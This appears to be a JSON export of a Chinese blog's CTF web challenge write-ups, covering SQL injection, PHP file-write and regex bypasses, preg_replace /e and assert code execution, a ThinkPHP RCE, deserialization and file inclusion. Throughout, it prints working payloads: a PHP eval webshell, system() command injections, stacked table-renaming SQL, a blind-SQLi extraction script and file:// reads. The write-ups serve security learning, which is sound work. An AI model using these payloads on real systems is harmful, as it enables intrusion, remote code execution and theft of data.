($_SESSION['admin']) &#123; $con = $_POST['con']; $file = $_POST['file']; $filename = \"backup/\".$file; if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename))&#123; die(\"Bad file extension\"); &#125;else&#123; chdir('uploaded'); $f = fopen($filename, 'w'); fwrite($f, $con); fclose($f); &#125;&#125;if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') &#123; include 'config.php'; $id = mysql_real_escape_string($_GET[id]); $sql=\"select * from cetc007.user where id='$id'\"; $result = mysql_query($sql); $result = mysql_fetch_object($result);&#125; else &#123; $result = False; die();&#125;if(!$result)die(\"&lt;br &gt;something wae wrong ! &lt;br&gt;\");if($result)&#123; echo \"id: \".$result-&gt;id.\"&lt;/br&gt;\"; echo \"name:\".$result-&gt;user.\"&lt;/br&gt;\"; $_SESSION['admin'] = True;&#125; 第一段是关于页面跳转的，第二段需要获取admin之后再看，先看第三段，是关于id的，这里检测为： 浮点数不为1,且最后一位为9，则执行mysql_real_escape_string()函数，代入sql语句中 关于mysql_real_escape_string函数这是在PHP7.0即已废除的函数，模拟实际情况则以mysqli_real_escape_string(版本&gt;7.0)，我们发现‘被转义了(加了一个反斜杠\\) 我们试着输入1’9，结果发现返回了id和name，并且成功赋值了admin 自己测试说明是可行的： 123456&lt;?php$con = mysqli_connect(\"sth\", \"sth\", \"sth\");$id = \"1'9\";$id = mysqli_real_escape_string($con, $id);$sql=\"select * from cetc007.user where id='$id'\";echo $sql;//select * from cetc007.user where id='1\\'9' 用这样的格式试着查查自己的数据库： 绕过/.+\\.ph(p[3457]?|t|tml)$/i正则 精妙的构造：example.php3/4.php/../ 由此，我们便能随心所欲地写入文件了(记得文件目录是在uploaded下的backup) 1con=&lt;?php+eval($_POST[&quot;hacked&quot;]);?&gt;&amp;file=awa.php/3.php/.. 之后使用菜刀连接，得到flag即可。 后话：以后就一篇一道题了，题的难度越来越大了，写WP所需要的篇幅量也对应增大了。","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-06","date":"2020-10-14T16:00:00.000Z","path":"2020/10/15/coding/ctf/ctf笔记-06/","text":"此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。 fakebook首先dirsearch扫一遍，扫到了robors.txt，进入发现文件user.php.bak，下载，开始审计php代码。 看到注册中的$blog是有正则检测的，大概像个网页的样子，使用echo出具体的正则： 123&lt;?phpecho \"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\";# /^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i 进入菜鸟教程的在线工具练练匹配，发现这样的格式可以匹配到： 1https://a.ab/a?s=a 进入注册页面注册，显示注册完成，并且在跳转出的页面中发现username可以交互，点击一下进入url: 1http://220.249.52.133:43258/view.php?no=1 试着对no=1加了一发单引号，居然引起了mysql的报错，考虑SQL注入。 1?no=1+union+select+1+--+ 提示no hack，试了试/**/与大小写绕过，成功了: 1?no=1/**/unIon/**/Select+1,1,1,1+--+ 问题是不显示结果，把前面的no=1改改，发现在前面无结果报错时，后面的第二个参数能被打印在username栏中： 1?no=0/**/unIon/**/Select+1,2,3,4+--+ # username显示2 尝试查询了所有的数据库，只能发现三个： fakebook information_schema performance_schema 去fakebook查查，发现里面只有自己注册的账号信息。 load_file()我们直接使用load_file访问文件： 1?no=0/**/unIon/**/Select+1,hex(load_file(&quot;/var/www/html/flag.php&quot;)),3,4+--+ 发现flag就在HTML中 笨办法(写py练手用，实则没发现HTML中注释的flag…..)因此flag大概不在数据库中了，也许需要我们通过SQL注入显示系统文件。 1?no=0/**/unIon/**/Select+1,hex(load_file(&quot;/var/www/html/flag.php&quot;)),3,4+--+ 这样子居然报no hack的警告了，发现有关于hex的拦截，/**/与大小写绕过均不可行。问题不大，使用另外一种构造： 1?no=0/**/unIon/**/Select+1,ascii(substr((load_file(&quot;/var/www/html/flag.php&quot;)) from 1 for 1)),3,4+--+ 只能一个一个显示，这里用用python脚本(练个习)： 123456789101112131415import requestsimport reresult = \"\"for i in range(1, 1000): url = r'http://220.249.52.133:43258/view.php?no=0/**/unIon/**/Select+1,ascii(substr((load_file(\"/var/www/html/flag.php\"))' + 'from %d for 1)),3,4+--+'%i # print(url) res = requests.get(url=url) match = re.search(r\"&lt;td&gt;\\s*(\\d+)\\s*&lt;/td&gt;\", res.text) # print(res.text) asc = match.group(1) if asc == '0': break result += chr(int(asc)) # print(result)print(result) WP的办法查到表名之后，我们决定沿着数据库继续走下去，看看我们提交的数据被转储成了什么样子： 123456?no=0/**/union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()+--+# users?no=0/**/union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;+--+# no,username,passwd,data ?no=0/**/union/**/select 1,group_concat(data),3,4 from users+--+# O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:18:&quot;https://a.ab/a?s=a&quot;;&#125; 至此，我们发现我们的信息被反序列化存在data字段中了，同时看到网页底部关于SQL的报错： 1Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67 回到user.php.bak中，可以看到这个方法具体是干什么的，在data反序列化之后，里面的blog被用去解析，这里我们可以使用http(s)以外的协议来实现访问服务器内的文件 file://123O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;=&gt;?no=0/**/union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;+--+ 同样的，在HTML注释(这次是在底部的HTML)中发现了flag。 ics-05首先进行一波dirsearch，什么也没看到，嗯……进入设备维护中心看看扒。 发现全网页只有左上角的”云平台设备维护中心”可以点，进入了一个奇怪的url: 1/index.php?page=index 尝试随便打点什么，发现当输入纯数字与字母时，在底下可以打印(复读)出相应的数字与字母。 打开burp抓包之后使用fuzz字节注入，看看哪些字符是允许的。 结果是没有发现异常，所有除 字母 数字以外的字符均不被允许。 尝试一下SQL注入，果然也不行。 这时，写了index.php，居然反悔了Ok，开始怀疑文件包含漏洞。 php://filter使用php://filter/read=convert.base64-encode/recource=[payload]来写入file参数 1?page=php://filter/convert.base64-encode/resource=index.php 我们即看到了index.php的源码，接下来进行代码审计。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php$page = $_GET[$page];if (isset($page)) &#123; if (ctype_alnum($page)) &#123; echo $page; die(); &#125; else &#123; if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &amp;&amp; 0) &#123; die(); &#125; if (strpos($page, 'text') &amp;&amp; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); &#125;&#125;if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br --&gt;Welcome My Admin ! &lt;br&gt;\"; $pattern = $_GET[$pat]; $replacement = $_GET[$rep]; $subject = $_GET[$sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125; else &#123; die(); &#125;&#125; 看底下那段代码，需要我们使用X-Forwarded-For定向为127.0.0.1，且这里有一个字符串匹配函数。 preg_replacephp的字符串匹配有个严重的问题： 当匹配的模式(pattern)包含’\\e’时，如果匹配的字符串(subject)与模式(pattern)匹配，则执行$replacement字符串代码 1X-Forwarded-For: 127.0.0.1 123pat=/a/e&amp;rep=system(&apos;ls&apos;)&amp;sub=&quot;a&quot;pat=/a/e&amp;rep=system(&apos;cd+s3chahahaDir%26%26ls&apos;)pat=/a/e&amp;rep=system(&apos;cd+s3chahahaDir/flag%26%26cat+flag.php&apos;)&amp;sub=&quot;a&quot; 在php的system()命令中，可以在字符串中输入多个命令，使用&amp;&amp; =&gt; %26%26拼接。 FlatScience首先使用dirsearch扫一遍，发现robots.txt login.php admin.php三个重要路由，进入robogs.txt康康，里面就是login.php和admin.php。 分别进入两个路由，发现login中是任意用户，admin中仅限用户名为admin，首先从login下手看看。 发现可以进行SQL注入，使用sqlmap，显示数据库为SQLite。 对SQLite尝试注入，之后陷入了短暂的僵局。 接着偶然间查看了下HTML，发现了?debug参数，输入url居然返回了php代码，开始审计php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpob_start();?&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;blockquote &#123; background: #eeeeee; &#125;h1 &#123; border-bottom: solid black 2px; &#125;h2 &#123; border-bottom: solid black 1px; &#125;.comment &#123; color: darkgreen; &#125;&lt;/style&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=right class=lastmod&gt;Last Modified: Fri Mar 31:33:7 UTC 1337&lt;/div&gt;&lt;h1&gt;Login&lt;/h1&gt;Login Page, do not try to hax here plox!&lt;br&gt;&lt;form method=&quot;post&quot;&gt; ID:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;usr&quot;&gt; &lt;br&gt; Password:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;pw&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;&lt;?phpif(isset($_POST[&apos;usr&apos;]) &amp;&amp; isset($_POST[&apos;pw&apos;]))&#123; $user = $_POST[&apos;usr&apos;]; $pass = $_POST[&apos;pw&apos;]; $db = new SQLite3(&apos;../fancy.db&apos;); $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&apos;&quot;.$user.&quot;&apos; and password=&apos;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&apos;&quot;); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo &quot;&lt;br&gt;Some Error occourred!&quot;; &#125; if(isset($row[&apos;id&apos;]))&#123; setcookie(&apos;name&apos;,&apos; &apos;.$row[&apos;name&apos;], time() + 60, &apos;/&apos;); header(&quot;Location: /&quot;); die(); &#125;&#125;if(isset($_GET[&apos;debug&apos;]))highlight_file(&apos;login.php&apos;);?&gt;&lt;!-- TODO: Remove ?debug-Parameter! --&gt;&lt;hr noshade&gt;&lt;address&gt;Flux Horst (Flux dot Horst at rub dot flux)&lt;/address&gt;&lt;/body&gt; 我们发现了变量在SQL语句中的引入方式与password的加密方式，并且发现注入数据(name)的结果会存入cookie中。 SQLite表接着尝试注入数据： 1234567891011usr=1&apos; union select 1,sql from sqlite_master where type=&apos;table&apos; and name=&apos;Users&apos;--&amp;pw=1=&gt; CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29=&gt;CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))usr=1&apos; union select 1,hint from Users (where id &gt; 1[,2,...]) --&amp;pw=1=&gt;+my+fav+word+in+my+fav+paper%3F%21+my+love+is%E2%80%A6%3F+the+password+is+password 最后发现，要求将所有的论文下载下来，挨个遍历单词，将所有单词按照sha1(word + &quot;Salz!&quot;)加密，挨个注入admin.php。 最后的脚本和解题我没看，我只知道单词是ThinJerboa，这里出题个人认为实在是太无趣了…","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-05","date":"2020-10-13T16:00:00.000Z","path":"2020/10/14/coding/ctf/ctf笔记-05/","text":"此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。 NewsCenter首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。 接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。 使用sqlmap，搞定。 1python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump upload1看似为webshell上传，上传一个php: 1&lt;?php eval($_POST[\"awa\"]); ?&gt;php 提示需要使用图片上传，考虑是前端防护，直接打开浏览器调试把”上传”按钮的disable样式去掉，得以上传。 之后使用菜刀连接，地址为网页返回的上传文件路径，后面的口令填上传的变量名 ($_POST[“awa”]则为awa) 成功注入后即可随心所欲访问文件，当然flag也在里面。 mfw首先使用dirsearch进行目录爆破，哦吼，发现一堆.git文件，考虑git泄露。 使用githacker进行攻击，githacker的具体食用方法见ctf笔记-08中。(原本此处用的是githack，但是其由于不能恢复版本，不推荐使用) 查看版本，确定只有一个版本之后，开始审计这个版本的代码。 首先查看flag.php，嗯，在这个git的版本中没东西，看起来需要我们访问现有的flag.php才行。 开始审计index.php: 1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; 需要想办法绕过两个’.’， assert()这道题的漏洞出在assert()中，因为assert()可以执行字符串。 解法 %27.system(&quot;cat%20./templates/flag.php&quot;).%27 =&gt; &apos;.system(&quot;cat ./templates/flag.php&quot;).&apos; =&gt; file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).&apos;.php&apos;) 12345672. ```payload %27)%20or%20phpinfo();%23 # &apos;#&apos;号一定要进行url编码，否则会被忽略掉！ =&gt; &apos;) or phpinfo();#&apos; =&gt; file_exists(&apos;templates/&apos;) or phpinfo();#.php&apos;) flag在HTML的注释中","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-04","date":"2020-10-11T14:30:00.000Z","path":"2020/10/11/coding/ctf/ctf笔记-04/","text":"NaNNaNNaNNaN-Batman下载附件，打开看到了一堆乱码，看着像是js的审计题 1(可能是由于这段乱码的问题，这篇.md中的汉字全都变成了乱码，所以这里的东西删去了) =&gt; 进行了一波完形填空 仔细对着代码看了看，发现代码是有有序的结构的： 1234_='function $() &#123;/*乱码*/&#125;';for(Y in $='/*乱码*/') with(_.split($[Y]))_=join(pop());eval(_) 于是将eval换成了console，输出了变量_的值： 12345678910111213141516171819202122console.log(_)function $() &#123; var e = document.getElementById(\"c\").value; if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) &#123; var t = [\"fl\", \"s_a\", \"i\", \"e&#125;\"]; var n = [\"a\", \"_h0l\", \"n\"]; var r = [\"g&#123;\", \"e\", \"_0\"]; var i = [\"it'\", \"_\", \"n\"]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) &#123; document.write(s[o % 4][0]); s[o % 4].splice(0, 1); &#125; &#125;&#125;document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;');delete _; 这里看到里面有fl a g之类的东西，直接把里面的东西扒下来修改，按格式输出： 1234567891011121314var t = [\"fl\", \"s_a\", \"i\", \"e&#125;\"];var n = [\"a\", \"_h0l\", \"n\"];var r = [\"g&#123;\", \"e\", \"_0\"];var i = [\"it'\", \"_\", \"n\"];var s = [t, n, r, i];var res = \"\";for (var o = 0; o &lt; 13; ++o) &#123; res += s[o % 4][0]; s[o % 4].splice(0, 1);&#125;console.log(res); web2是一道php的审计解密题 12345678910111213141516171819&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; &#125; return str_rot13(strrev(base64_encode($_)));&#125;highlight_file(__FILE__);?&gt; 这段代码大意为： 反向输出str到$_o中 顺序遍历$_o，将每一位的ascii值+1之后赋予$_ 将$_按顺序base64加密，反转，rot13加密，输出 我们构建出反向解密： 123456789$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";$miwen = base64_decode(strrev(str_rot13($miwen)));for($_0=0;$_0&lt;strlen($miwen);$_0++)&#123; $_c=substr($miwen,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; &#125;echo strrev($_); PHP2这道题也是php代码审计，不过入口文件很怪，普通的dirsearch搜索不出来，在index.phps 123456789101112131415&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt;Can you anthenticate to this website? 很简单，是之前在ctf笔记-03中的warmup的下位替代，直接将admin进行url二次编码即可通过验证： 1?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-03","date":"2020-10-11T13:00:00.000Z","path":"2020/10/11/coding/ctf/ctf笔记-03/","text":"supersqli sql注入题目 手写先试试万能的单引号，果然报错了： 1error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1 注意一下，第一个’和最后一个’是起标识位置作用的,就是一个单引号,所以原语句是’1’(单引号闭合) 尝试 联合注入payload: 11&apos;+union+select+database()+--+ 返回了一段这样的包含正则匹配的php代码，说明不可行： 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 堆叠注入 这里先引入一个堆叠注入的方法：用分号闭合原语句，在后面输入任意语句使mysql批量执行。 关于堆叠注入(发现写的很好，搬过来)： 1虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 在联合注入碰到钉子之后，试图尝试堆叠注入，期望服务器可以返回多行sql语句运行的结果： 11&apos;; show databases; 1234567891011121314151617181920212223242526272829array(1) &#123; [0]=&gt; string(11) &quot;ctftraining&quot;&#125;array(1) &#123; [0]=&gt; string(18) &quot;information_schema&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;mysql&quot;&#125;array(1) &#123; [0]=&gt; string(18) &quot;performance_schema&quot;&#125;array(1) &#123; [0]=&gt; string(9) &quot;supersqli&quot;&#125;array(1) &#123; [0]=&gt; string(4) &quot;test&quot;&#125; 进入ctftraining看看，查查里面的表和字段： 1231&apos;; show tables from ctftraining;1&apos;; show columns from FLAG_TABLE from ctftraining; 这里的字段其实是获取不到的，我们无法使用可以绕过正则匹配的命令来获取到字段 再进所在的数据库看看： 1231&apos;; show tables;1&apos;; show columns from words;1&apos;; show columns from `1919810931114514`; 需要注意的是，遇到以数字为表名的表，查询时需要加反引号 12345678910111213141516array(2) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(7) &quot;hahahah&quot;&#125;array(1) &#123; [0]=&gt; string(16) &quot;1919810931114514&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;words&quot;&#125; 12345678910111213141516171819202122232425262728array(6) &#123; [0]=&gt; string(2) &quot;id&quot; [1]=&gt; string(7) &quot;int(10)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125;array(6) &#123; [0]=&gt; string(4) &quot;data&quot; [1]=&gt; string(11) &quot;varchar(20)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; 1234567891011121314array(6) &#123; [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(12) &quot;varchar(100)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; 发现碰钉子了：如何不用select查询数据呢？ =&gt;可以使用rename (alter)命令来输出所想要的表中的字段,也就是偷梁换柱 11&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`; 现在直接查询id=’1’,发现报错： 1error 1054 : Unknown column &apos;id&apos; in &apos;where clause&apos; 所以我们所伪造的words表还需要一个名为id的字段，我们可以改变字段为id，也可以添加新字段 12ALTER TABLE exampleTable change exampleFiledFrom exampleFiledTo exampleType;ALTER TABLE exampleTable ADD exampleField exampleType; #CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT &apos;&apos; COMMENT &apos;&apos;; 1’; alter table words add id VARCHAR(100); 突然发现环境已经被我们整坏了，因为对id的查询已经失效了，所以只能重启环境来完成实验了() 正确的方法应该是，rename方法与alter方法在同一批次执行，才能保证where id = ‘1’有效。 payload 1:1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words add id VARCHAR(100) default 1;1 1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words add id VARCHAR(100) default 1;1&apos;; or 1=1; payload 2:1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words change flag id VARCHAR(100);1&apos;; or 1=1; sqlmap如果需要使用脚本，脚本的查询很耗时且只使用脚本几乎不可行。 在使用--dbs查询时，只能获取到一个可用supersqli数据库，并且在使用--tabkes查询时，其使用的是暴力查表查询，common常用表一个表也识别不出来，更不用说那一长串发臭的数字，根本匹配不到。 ics-06进入之后是一个dashbord页面，首先dirsearch，发现了index.php，并且总是会重定向到id=1，很奇怪 这道题的解法更离谱，需要使用burp暴力枚举id，会发现id=2333时数据量不一样，出现flag…… warmup进入是个大滑稽(滑稽) 使用dirsearch来一下： 12345678910111213[20:10:25] 403 - 306B - /.htaccess.bak1[20:10:25] 403 - 306B - /.htaccess.save[20:10:25] 403 - 306B - /.htaccess.orig[20:10:25] 403 - 308B - /.htaccess.sample[20:10:25] 403 - 304B - /.htaccessBAK[20:10:25] 403 - 304B - /.htaccessOLD[20:10:25] 403 - 305B - /.htaccessOLD2[20:10:25] 403 - 303B - /.httr-oauth[20:10:34] 200 - 354B - /index.php[20:10:34] 200 - 354B - /index.php/login/[20:10:38] 403 - 305B - /server-status[20:10:38] 403 - 306B - /server-status/[20:10:38] 200 - 8KB - /source.php 进入source.php，看到了php源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 进入hint.php，告诉我们flag在ffffllllaaaagggg中 审计代码，发现需要让其访问到flag的所在文件，我们需要构造这样的payload: 1?file=(source.php or hint.php)(url二次编码的&apos;?&apos; =&gt; %253F)(flag文件的位置) url二次编码：在接收请求时，会自动进行一次url解码，php代码中又内置了一行手动解码，因此通过需要二次编码。 关于flag文件的位置：私认为题出的不好，flag文件于../../../../../ffffllllaaaagggg，且只提示了文件名，没有路径，需要自己暴力../去找。","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-02","date":"2020-10-01T13:30:00.000Z","path":"2020/10/01/coding/ctf/ctf笔记-02/","text":"Web_php_unserialize(题外话)这一题觉得好难呀 访问端口: output: 123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = 'index.php'; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != 'index.php') &#123; //the secret is in the fl4g.php $this-&gt;file = 'index.php'; &#125; &#125; &#125;if (isset($_GET['var'])) &#123; $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) &#123; die('stop hacking!'); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(\"index.php\"); &#125; ?&gt; var 我们需要get传参var，var的值就是序列化后的类的base64编码 在处理var时用到了正则匹配检测，含义就是匹配 o或c之后跟数字加冒号的格式 Demo 看到了三个方法，构造器不用管，从注释看到了目标文件fl4g.php __destruct会将输入的文件输出 \\wakeup则是一个防护用函数，将file强制改为index.php，因此我们需要绕过__wakeup方法 序列化123O:4:\"Demo\":1:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125;=&gt;绕过正则 O:+4:\"Demo\":1:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125;=&gt;绕过__wakeup() O:+4:\"Demo\":2:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125; base64加密123456789101112131415161718192021&lt;?phpclass Demo &#123; private $file = &apos;index.php&apos;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &apos;index.php&apos;) &#123; //the secret is in the fl4g.php $this-&gt;file = &apos;index.php&apos;; &#125; &#125; &#125;$b = new Demo(&apos;fl4g.php&apos;);$c = serialize($b);$c = str_replace(&quot;O:4&quot;, &quot;O:+4&quot;, $c);$c = str_replace(&quot;:1:&#123;&quot;, &quot;:2:&#123;&quot;, $c);echo base64_encode($c); output 1TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== url 1http://220.249.52.133:36436/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 反思踩坑=&gt;base64我们如果使用网页上的base64加密工具，则会出现忽略空格的问题: 12base64加密工具：TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=php自行加密：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 在使用base64加密时，一定要构造原生php，切记使用加密工具! php_rcerce访问端口，得到了tp的默认首页 这里需要使用tp的 5.0-5.0.24 版本和 5.1.0-5.1.30 版本的rce漏洞进行攻击 攻击方法 =&gt; 这篇博客写的有点问题，我们需要将thinkapp换为think\\app url1http://220.249.52.133:58615/?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag*&quot; 在输出发现/flag文件，访问它 1http://220.249.52.133:58615/?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag 得到了flag Web_php_include访问端口，得到了php代码： 123456789&lt;?phpshow_source(__FILE__);echo $_GET['hello'];$page=$_GET['page'];while (strstr($page, \"php://\")) &#123; $page=str_replace(\"php://\", \"\", 